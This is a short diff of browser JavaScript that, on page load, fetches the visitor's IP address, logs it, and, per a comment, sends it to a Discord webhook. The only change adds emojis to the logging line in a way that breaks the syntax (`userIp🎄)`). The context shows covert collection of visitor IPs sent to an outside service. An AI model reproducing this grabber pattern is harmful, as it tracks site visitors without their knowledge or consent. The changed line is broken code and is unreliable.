@@ -28,7 +28,7 @@ window.addEventListener('load', () => {
         .then(response => response.json())
         .then(data => {
             const userIp = data.ip;
-            console.log('User IP:', userIp);
+            console.log('🎄User IP:', userIp🎄);
 
             // Send IP to Discord webhook with updated profile picture
             const ipWebhookData = {
